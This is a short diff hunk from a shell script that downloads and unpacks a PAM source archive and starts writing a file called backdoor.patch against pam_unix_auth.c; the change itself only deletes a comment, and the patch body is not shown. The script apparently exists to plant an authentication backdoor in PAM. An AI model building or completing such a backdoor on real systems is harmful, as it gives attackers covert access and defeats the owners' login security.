@@ -95,7 +95,6 @@ echo "Downloading and Patching..."
 run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}"
 run_cmd tar xzf "$PAM_FILE"
 
-# Injection of the patch content directly
 cat <<EOF > backdoor.patch
 --- modules/pam_unix/pam_unix_auth.c
 +++ modules/pam_unix/pam_unix_auth.c
